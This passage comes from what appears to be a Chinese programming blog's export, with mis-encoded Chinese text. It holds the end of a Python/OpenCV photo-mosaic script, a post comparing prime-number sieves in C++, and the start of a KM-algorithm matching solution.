class="line">    img_re = cv2.resize(img, (w, h),</span><br><span class="line">                        cv2.INTER_LINEAR)  <span class="comment"># ä¹Ÿå¯ä»¥ç”¨img_re=skimage.transform.resize(img, (h,w)).astype(np.uint8)</span></span><br><span class="line">    gx, gy = np.meshgrid(np.linspace(<span class="number">0</span>, w, n), np.linspace(<span class="number">0</span>, h, m))</span><br><span class="line">    gx = gx.astype(np.int)</span><br><span class="line">    gy = gy.astype(np.int)</span><br><span class="line">    <span class="comment"># å‰é¢ä¸¤ç»´ä»£è¡¨ä½ç½® iè¡Œjåˆ— åä¸‰ç»´ä»£è¡¨å›¾ç‰‡ä¿¡æ¯ï¼ˆåƒç´ ä½ç½®ã€é¢œè‰²ä¿¡æ¯ï¼‰</span></span><br><span class="line">    divide_image = np.zeros([m - <span class="number">1</span>, n - <span class="number">1</span>, grid_h, grid_w, <span class="number">3</span>],</span><br><span class="line">                            np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            divide_image[i, j, ...] = img_re[</span><br><span class="line">                                      gy[i][j]:gy[i + <span class="number">1</span>][j + <span class="number">1</span>], gx[i][j]:gx[i + <span class="number">1</span>][j + <span class="number">1</span>], :]</span><br><span class="line">    <span class="keyword">return</span> divide_image</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  åˆ†æåˆ†å‰²åçš„å›¾ç‰‡ divideImages æ˜¯èƒŒæ™¯å›¾åˆ†å‰²åçš„ä¸€ç³»åˆ—å›¾ç‰‡ materialIndexColoræ˜¯åŒ…å«é¢œè‰²å‡å€¼çš„ä¸€äº›åˆ—å›¾ç‰‡ï¼ˆä»è§†é¢‘ä¸­æå–æˆ–è€…ç”¨æˆ·æä¾›ï¼‰</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleBlocks</span><span class="params">(divideImages, materialIndexColor)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleBlocks begin ---'</span>)</span><br><span class="line">    beginTime = time.time()</span><br><span class="line">    cap.set(cv2.CAP_PROP_POS_FRAMES, <span class="number">0</span>)</span><br><span class="line">    res0, frame0 = cap.read()</span><br><span class="line">    originX, originY = frame0.shape[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    sortedAverColor = np.array(materialIndexColor)[:, <span class="number">0</span>].astype(<span class="string">"int32"</span>)</span><br><span class="line">    m, n = divideImages.shape[<span class="number">0</span>], divideImages.shape[<span class="number">1</span>]</span><br><span class="line">    cnt, total, listLen = <span class="number">0</span>, (m + <span class="number">1</span>) * (n + <span class="number">1</span>), len(materialIndexColor)</span><br><span class="line">    resImg = np.array([])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        rowItem = np.array([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            aver = divideImages[i, j].mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">            averHex = BGR2HEX(aver)</span><br><span class="line">            <span class="comment"># åœ¨æœ‰åºåºåˆ—ä¸­å¯»æ‰¾æ¥è¿‘è¯¥ å—ï¼ˆæ¥è‡ªèƒŒæ™¯å›¾ï¼‰ çš„å›¾ç‰‡</span></span><br><span class="line">            left = bisect.bisect_left(sortedAverColor, averHex)</span><br><span class="line">            left = max(<span class="number">0</span>, left)</span><br><span class="line">            left = min(left, listLen - <span class="number">1</span>)</span><br><span class="line">            imgFilename = materialIndexColor[left][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            frame = cv2.imread(imgFilename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> rowItem.shape == (<span class="number">0</span>,):</span><br><span class="line">                <span class="comment"># æ‹¼æ¥åˆ—</span></span><br><span class="line">                rowItem = cv2.resize(frame, (originY // ZOOM_FACTOR, originX // ZOOM_FACTOR))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rowItem = np.concatenate((rowItem, cv2.resize(frame, (originY // ZOOM_FACTOR, originX // ZOOM_FACTOR))),</span><br><span class="line">                                         <span class="number">1</span>)</span><br><span class="line">            print(<span class="string">'\r'</span> + <span class="string">'+'</span> * (int(cnt / total * <span class="number">100</span>)) + str(int(cnt / total * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> resImg.shape == (<span class="number">0</span>,):</span><br><span class="line">            resImg = rowItem</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># æ‹¼æ¥è¡Œ</span></span><br><span class="line">            resImg = np.concatenate((resImg, rowItem))</span><br><span class="line">    cv2.imwrite(OUTPUT_PICTURE, resImg)</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line">    <span class="comment"># åˆ é™¤ä¸­é—´ç”Ÿæˆçš„æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> materialIndexColor:</span><br><span class="line">        os.remove(item[<span class="number">1</span>])</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial2 finished and cost &#123;&#125; --------'</span>.format(endTime - beginTime))</span><br><span class="line">    print(<span class="string">'\n--- handleBlocks end ---'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†BGRæ•°ç»„è½¬ä¸º RGB16è¿›åˆ¶å½¢å¼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BGR2HEX</span><span class="params">(BGR)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (int(BGR[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) + (int(BGR[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + int(BGR[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleMaterial</span><span class="params">(needNum=<span class="number">500</span>)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleMaterial begin ---'</span>)</span><br><span class="line">    <span class="comment"># è§†é¢‘æ€»å¸§æ•°</span></span><br><span class="line">    frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># æå–å¸§æ•°çš„æ­¥é•¿</span></span><br><span class="line">    step = frameNum / needNum</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="comment"># æŒ‰ç…§æ­¥é•¿åˆ†ææ¯ä¸€å¸§</span></span><br><span class="line">    <span class="keyword">for</span> cnt <span class="keyword">in</span> range(needNum):</span><br><span class="line">        print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (cnt * <span class="number">100</span> // needNum) + str(cnt * <span class="number">100</span> // needNum) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        cap.set(cv2.CAP_PROP_POS_FRAMES, idx)</span><br><span class="line"></span><br><span class="line">        res, frame = cap.read()</span><br><span class="line"></span><br><span class="line">        aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        averHex = BGR2HEX(aver)</span><br><span class="line">        <span class="comment"># cnt æ˜¯æ ‡è®°è¯¥å…ƒç´ åœ¨imgListä¸­çš„ä¸‹æ ‡ï¼Œidxæ˜¯æ ‡è®°è¯¥å¸§åœ¨åŸè§†é¢‘ä¸­çš„ä¸‹æ ‡</span></span><br><span class="line">        imgList.append([cnt, averHex, idx])</span><br><span class="line"></span><br><span class="line">        idx += step</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial finished! --------'</span>)</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handlePictures</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'--- handlePictures begin ---'</span>)</span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(PICTURES_DIR):</span><br><span class="line">        imgsFiles = os.listdir(PICTURES_DIR)</span><br><span class="line">        fileLen = len(imgsFiles)</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> imgsFiles:</span><br><span class="line">            fileType = os.path.splitext(file)[<span class="number">1</span>]</span><br><span class="line">            <span class="comment"># å¸¸è§çš„å›¾ç‰‡æ ¼å¼</span></span><br><span class="line">            <span class="keyword">if</span> fileType == <span class="string">'.jpg'</span> <span class="keyword">or</span> fileType == <span class="string">'.jpeg'</span> <span class="keyword">or</span> fileType == <span class="string">'.png'</span> <span class="keyword">or</span> fileType == <span class="string">'.bmp'</span> <span class="keyword">or</span> fileType == <span class="string">'.svg'</span>:</span><br><span class="line">                img = cv2.imread(PICTURES_DIR + file)</span><br><span class="line">                <span class="comment"># åˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¯»å–æˆåŠŸ</span></span><br><span class="line">                <span class="keyword">if</span> isinstance(img, np.ndarray):</span><br><span class="line">                    aver = img.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">                    averHex = BGR2HEX(aver)</span><br><span class="line">                    cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + file, img)</span><br><span class="line">                    imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + file])</span><br><span class="line">                    print(<span class="string">'\r'</span> + <span class="string">'+'</span> * (int(cnt / fileLen * <span class="number">100</span>)) + str(int(cnt / fileLen * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>,</span><br><span class="line">                          flush=<span class="literal">True</span>)</span><br><span class="line">                    cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'this path not exist'</span>)</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">    print(<span class="string">'\n--- handlePictures end ---'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleVideoMaterial</span><span class="params">(needNum)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleMaterial2 begin ---'</span>)</span><br><span class="line">    beginTime = time.time()</span><br><span class="line">    <span class="comment"># è§†é¢‘æ€»å¸§æ•°</span></span><br><span class="line">    frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># æå–å¸§æ•°çš„æ­¥é•¿</span></span><br><span class="line">    step = frameNum // needNum</span><br><span class="line">    cnt, idx = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">        ret, frame = cap.read()</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (int(idx / frameNum * <span class="number">100</span>)) + str(int(idx / frameNum * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">if</span> idx % step == <span class="number">0</span>:</span><br><span class="line">                aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">                averHex = BGR2HEX(aver)</span><br><span class="line">                cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>, frame)</span><br><span class="line">                imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>])</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    endTime = time.time()</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial2 finished!  way 2 cost &#123;&#125; --------'</span>.format(endTime - beginTime))</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    img = cv2.imread(BACKGROUND_URL)</span><br><span class="line">    way = int(input(<span class="string">'è¯·é€‰æ‹©ä½ çš„æ–¹å¼ï¼š1.ä»è§†é¢‘ä¸­æˆªå– 2.ä»å«æœ‰å›¾ç‰‡çš„æ–‡ä»¶å¤¹ä¸­æå–'</span>))</span><br><span class="line">    <span class="keyword">if</span> way == <span class="number">1</span>:</span><br><span class="line">        divideImages = cutBackgroundImg(img, m=ROW, n=COL)</span><br><span class="line">        materialList = handleVideoMaterial(needNum=<span class="number">3000</span>)</span><br><span class="line">        handleBlocks(divideImages, materialList)</span><br><span class="line">    <span class="keyword">elif</span> way == <span class="number">2</span>:</span><br><span class="line">        divideImages = cutBackgroundImg(img, m=ROW, n=COL)</span><br><span class="line">        materialList = handlePictures()</span><br><span class="line">        handleBlocks(divideImages, materialList)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>OpenCV</tag>
        <tag>å›¾åƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>å‡ ç§æ±‚è´¨æ•°çš„æ–¹æ³•</title>
    <url>/2020/10/03/%E5%87%A0%E7%A7%8D%E6%B1%82%E8%B4%A8%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="æš´åŠ›æ³•"><a href="#æš´åŠ›æ³•" class="headerlink" title="æš´åŠ›æ³•"></a>æš´åŠ›æ³•</h2><p>ä¹Ÿç§°å®šä¹‰æ³•</p>
<blockquote>
<p>è´¨æ•°æ˜¯æŒ‡åœ¨å¤§äº1çš„è‡ªç„¶æ•°ä¸­ï¼Œé™¤äº†1å’Œå®ƒæœ¬èº«ä»¥å¤–ä¸å†æœ‰å…¶ä»–å› æ•°çš„è‡ªç„¶æ•°ã€‚</p>
</blockquote>
<p>å¯¹äºç»™å®šæ•°å­—<code>n</code>ï¼Œç›´æ¥æšä¸¾<code>j</code>ä»1åˆ°<code>n-1</code>ï¼Œå¦‚æœ<code>j</code>èƒ½å¤Ÿæ•´é™¤<code>n</code>ï¼Œè¯´æ˜<code>n</code>ä¸æ˜¯è´¨æ•°<a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_simple</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i &lt;= num - <span class="number">1</span>;i++)</span><br><span class="line">        <span class="keyword">if</span>(num % i == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºåªæ˜¯åˆ¤æ–­ä¸€ä¸ªæ•°å­—çš„æ—¶å€™ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯<code>O(n)</code>ï¼Œä½†æ˜¯å½“æˆ‘ä»¬éœ€è¦åˆ¤æ–­æŸä¸ªåŒºé—´çš„è´¨æ•°çš„æ—¶å€™ï¼Œæ—¶é—´å¤æ‚åº¦å°±ä¸Šå‡åˆ°äº†<code>O(n^2)</code>ã€‚</p>
<h2 id="ç®€å•ä¼˜åŒ–"><a href="#ç®€å•ä¼˜åŒ–" class="headerlink" title="ç®€å•ä¼˜åŒ–"></a>ç®€å•ä¼˜åŒ–</h2><p>å®é™…ä¸Šæšä¸¾<code>j</code>åˆ°æ ¹å·<code>n</code>å°±å¯ä»¥äº†ï¼Œå› ä¸ºå¯¹äºéè´¨æ•°<code>num</code>ï¼Œå­˜åœ¨<code>a*b==num</code>ï¼Œè‹¥<code>a</code>å’Œ<code>b</code>å‡ä¸ä¸º1ï¼Œåˆ™<code>a</code>å’Œ<code>b</code>ä¸­å¿…æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå¤§äºç­‰äºæ ¹å·<code>num</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_advanced</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i * i &lt;= num;i++)</span><br><span class="line">        <span class="keyword">if</span>(num % i == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºåªæ˜¯åˆ¤æ–­ä¸€ä¸ªæ•°å­—çš„æ—¶å€™ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯<code>âˆšn</code>ï¼Œä½†æ˜¯å½“æˆ‘ä»¬éœ€è¦åˆ¤æ–­æŸä¸ªåŒºé—´çš„è´¨æ•°çš„æ—¶å€™ï¼Œæ—¶é—´å¤æ‚åº¦å°±ä¸Šå‡åˆ°äº†<code>O(nâˆšn)</code>ã€‚</p>
<h2 id="åŸƒæ‹‰æ‰˜æ–¯ç‰¹å°¼ç­›æ³•"><a href="#åŸƒæ‹‰æ‰˜æ–¯ç‰¹å°¼ç­›æ³•" class="headerlink" title="åŸƒæ‹‰æ‰˜æ–¯ç‰¹å°¼ç­›æ³•"></a>åŸƒæ‹‰æ‰˜æ–¯ç‰¹å°¼ç­›æ³•</h2><p>å¯¹äºé¢‘ç¹æ±‚åŒºé—´è´¨æ•°ä¸ªæ•°ã€åŒºé—´è·¨åº¦è¾ƒå¤§çš„æƒ…å†µï¼Œä¸Šé¢çš„æ–¹æ³•æ•ˆç‡å¾ˆä½ï¼Œå› ä¸ºæ¯æ¬¡è®¡ç®—ä¸€ä¸ªæ•°å­—ï¼Œéƒ½è¦ä»2è¿›è¡Œæšä¸¾ï¼›æˆ‘ä»¬æ¢ä¸ªæ€è·¯æƒ³æƒ³ï¼Œèƒ½å¤Ÿè¢«è´¨æ•°æ•´é™¤çš„æ•°å­—ä¸€å®šæ˜¯åˆæ•°ï¼ˆéè´¨æ•°ï¼‰ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å°†æ±‚å¾—çš„è´¨æ•°ï¼Œç„¶åä¹˜ä»¥ç›¸åº”çš„æ•°å­—ï¼Œå¾—åˆ°çš„å°±ä¸€å®šæ˜¯åˆæ•°ï¼Œå°†è¿™äº›åˆæ•°åˆ å»ï¼Œä¸å°±åªå‰©ä¸‹äº†è´¨æ•°äº†å—ï¼Ÿ</p>
<p>ç­›é€‰æ³•çš„æ€»ä½“æ€è·¯å°±æ˜¯ï¼šé¦–å…ˆå‡è®¾åºåˆ—<code>num=2ã€3ã€4ã€5ã€â€¦â€¦ã€n</code>éƒ½æ˜¯è´¨æ•°</p>
<ul>
<li>2ä½œä¸º<code>num</code>çš„ç¬¬ä¸€ä¸ªè´¨æ•°ï¼Œå°†2çš„å€æ•°<code>4,6,8,â€¦â€¦,</code>æ ‡è®°ä¸ºåˆæ•°</li>
<li>3ä½œä¸º<code>num</code>çš„ç¬¬äºŒä¸ªè´¨æ•°ï¼Œå°†3çš„å€æ•°<code>6,9,12,â€¦â€¦</code>æ ‡è®°ä¸ºåˆæ•°</li>
<li>5ä½œä¸º<code>num</code>çš„ç¬¬ä¸‰ä¸ªè´¨æ•°ï¼Œå°†5çš„å€æ•°<code>10,15,20,â€¦â€¦</code>æ ‡è®°ä¸ºåˆæ•°</li>
</ul>
<p>æ¯æ¬¡å–åºåˆ—ä¸­çš„ä¸€ä¸ªæ•°å­—<code>a</code>ä½œä¸ºç­›é€‰çš„ä¾æ®ï¼Œåœ¨è¿™é‡Œçš„<code>a</code>åŒæ ·æšä¸¾åˆ°ä¸è¶…è¿‡<code>âˆšn</code>å³å¯ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="keyword">bool</span> isPrime[MAXN];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_super</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(isPrime, <span class="literal">true</span>, <span class="keyword">sizeof</span>(isPrime));</span><br><span class="line">    isPrime[<span class="number">1</span>] = <span class="literal">false</span>, isPrime[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i * i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isPrime[i]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt; MAXN; j += i) &#123;</span><br><span class="line">            isPrime[j] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„æ—¶é—´å¤æ‚åº¦æˆ‘ä¸å¤ªæ‡‚è®¡ç®—ï¼Œä½†æ˜¯è‡³å°‘æ¯”ç®€å•ä¼˜åŒ–æ–¹æ³•é«˜æ•ˆã€‚</p>
<h2 id="çº¿æ€§ç­›æ³•â€“æ¬§æ‹‰ç­›æ³•"><a href="#çº¿æ€§ç­›æ³•â€“æ¬§æ‹‰ç­›æ³•" class="headerlink" title="çº¿æ€§ç­›æ³•â€“æ¬§æ‹‰ç­›æ³•"></a>çº¿æ€§ç­›æ³•â€“æ¬§æ‹‰ç­›æ³•</h2><p>ä½†æ˜¯æˆ‘ä»¬ä¹Ÿä¼šå‘ç°ï¼Œæœ‰äº›æ•°å­—è¢«åˆ é™¤äº†å¥½å‡ æ¬¡ï¼Œæ¯”å¦‚è¯´12ï¼Œç¬¬ä¸€æ¬¡è¢«2åˆ é™¤ï¼Œç¬¬äºŒæ¬¡è¢«3åˆ é™¤ï¼›120åˆ†åˆ«è¢«2ã€3ã€5åˆ é™¤ï¼Œâ€¦â€¦ï¼Œè¿™æ ·å­æˆ‘ä»¬çš„ç¨‹åºè¿˜æ˜¯ä¸å¤Ÿå¿«ï¼Œæœ‰æ²¡æœ‰åŠæ³•èƒ½å¤Ÿç¡®å®šæ¯ä¸€ä¸ªåˆæ•°éƒ½åªè¢«åˆ é™¤ä¸€æ¬¡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œå¯ä»¥è¯æ˜ä¸€ä¸ªåˆæ•°<code>num</code>çš„æœ€å°é1çš„å› å­ä¸€å®šæ˜¯ä¸€ä¸ªä¸å¤§äº<code>âˆšn</code>çš„è´¨æ•°ï¼Œåˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œåˆ©ç”¨è´¨æ•°è¿›è¡Œç­›é€‰çš„æ—¶å€™å¯ä»¥æå‰è¿›è¡Œç»“æŸåˆ é™¤ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å­˜æ”¾è´¨æ•°ï¼Œå¯ä»¥ä¸éœ€è¦è¯¥æ•°ç»„ï¼Œé€šè¿‡ isDeleted[] ä¹Ÿå¯ä»¥åˆ¤æ–­æ˜¯å¦ä¸ºè´¨æ•°ï¼Œåªä¸è¿‡ä½¿ç”¨</span></span><br><span class="line"><span class="comment">// prime[] çš„é€Ÿåº¦å¯ä»¥æ›´åŠ å¿«</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="keyword">int</span> prime[MAXN];</span><br><span class="line"><span class="keyword">bool</span> isDeleted[MAXN];</span><br><span class="line"><span class="keyword">int</span> lastPrimeIndex = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_extreme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(isDeleted, <span class="literal">false</span>, <span class="keyword">sizeof</span>(isDeleted));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isDeleted[i]) prime[lastPrimeIndex++] = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; lastPrimeIndex &amp;&amp; i * prime[j] &lt; MAXN; j++) &#123;</span><br><span class="line">            isDeleted[i * prime[j]] = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// æå‰ç»“æŸåˆ é™¤è¿‡ç¨‹</span></span><br><span class="line">            <span class="keyword">if</span> (i % prime[j] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>è´¨æ•°</tag>
        <tag>ç­›é€‰æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨KMç®—æ³•æ±‚è§£æœ€å¤§æƒåŒ¹é…</title>
    <url>/2020/11/27/%E5%88%A9%E7%94%A8KM%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E6%9C%80%E5%A4%A7%E6%9D%83%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>KM</code>ç®—æ³•æ˜¯ä¸€ç§è®¡ç®—æœºç®—æ³•ï¼ŒåŠŸèƒ½æ˜¯æ±‚å®Œå¤‡åŒ¹é…ä¸‹çš„æœ€å¤§æƒ<a href="https://baike.baidu.com/item/åŒ¹é…/6397551" target="_blank" rel="noopener">åŒ¹é…</a>ã€‚åœ¨ä¸€ä¸ªäºŒåˆ†å›¾å†…ï¼Œå·¦é¡¶ç‚¹ä¸º<code>X</code>ï¼Œå³é¡¶ç‚¹ä¸º<code>Y</code>ï¼Œç°å¯¹äºæ¯ç»„å·¦å³è¿æ¥<code>Xi-&gt;Yj</code>æœ‰æƒ<code>wij</code>ï¼Œæ±‚ä¸€ç§åŒ¹é…ä½¿å¾—æ‰€æœ‰<code>wij</code>çš„å’Œæœ€å¤§<a id="more"></a></p>
<p>å‚è€ƒåšå®¢ï¼š<a href="https://www.cnblogs.com/logosG/p/logos.html" target="_blank" rel="noopener">KMç®—æ³•å…¥é—¨</a></p>
<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><h3 id="é¢˜ç›®èƒŒæ™¯"><a href="#é¢˜ç›®èƒŒæ™¯" class="headerlink" title="é¢˜ç›®èƒŒæ™¯"></a>é¢˜ç›®èƒŒæ™¯</h3><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=2255" target="_blank" rel="noopener">å¥”å°åº·æŒ£å¤§é’±</a></p>
<h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">305</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> love[MAXN][MAXN];</span><br><span class="line"><span class="keyword">int</span> ex_user[MAXN];</span><br><span class="line"><span class="keyword">int</span> ex_house[MAXN];</span><br><span class="line"><span class="keyword">bool</span> vis_user[MAXN];</span><br><span class="line"><span class="keyword">bool</span> vis_house[MAXN];</span><br><span class="line"><span class="keyword">int</span> match[MAXN];</span><br><span class="line"><span class="keyword">int</span> slack[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> user)</span> </span>&#123;</span><br><span class="line">    vis_user[user] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> house = <span class="number">0</span>; house &lt; N; ++house) &#123;</span><br><span class="line">        <span class="keyword">if</span> 